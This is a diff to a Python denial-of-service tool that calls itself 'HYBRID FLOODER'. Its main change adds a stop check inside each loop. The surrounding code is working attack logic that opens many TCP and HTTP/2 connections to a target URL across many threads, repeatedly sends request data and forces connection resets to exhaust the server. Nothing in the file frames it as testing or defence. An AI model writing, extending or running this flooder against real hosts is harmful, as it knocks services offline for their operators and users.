@@ -1,5 +1,5 @@
 import threading, sys, random,socket,ssl,struct, base64
-from MODEL.data import get_target, generate_url_path
+from MODEL.data import get_target, generate_url_path, read
 
 from h2.connection import H2Connection
 from h2.config import H2Configuration
@@ -9,6 +9,7 @@ from h2.events import RequestReceived
 def keep_sending(sock,p):
     try:
         for _ in range(250):
+            if read() == True:break
             sock.sendall(p[0]); sock.sendall(p[1])
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
         sock.shutdown(socket.SHUT_RDWR)
@@ -31,6 +32,7 @@ def h2_con(target):
         conn.send_headers(stream_id, [(":method", meth), (":scheme", "https"), (":authority", target['host']), (":path", target['uri'])], end_stream=True)
         s.sendall(conn.data_to_send())
         while True:
+            if read() == True:break
             data = s.recv(65536)
             if not data:break
 
@@ -46,6 +48,7 @@ def connect(target, meth):
     try:
        path = 1
        for _ in range(250):
+        if read() == True:break
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
         s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
@@ -65,5 +68,6 @@ else:
     print(f'WELCOME TO HYBRID FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
 target = get_target(url)
 for _ in range(thread):
+        if read() == True:break
         threading.Thread(target=h2_con,args=(target,)).start()
         threading.Thread(target=connect, args=(target, meth)).start()
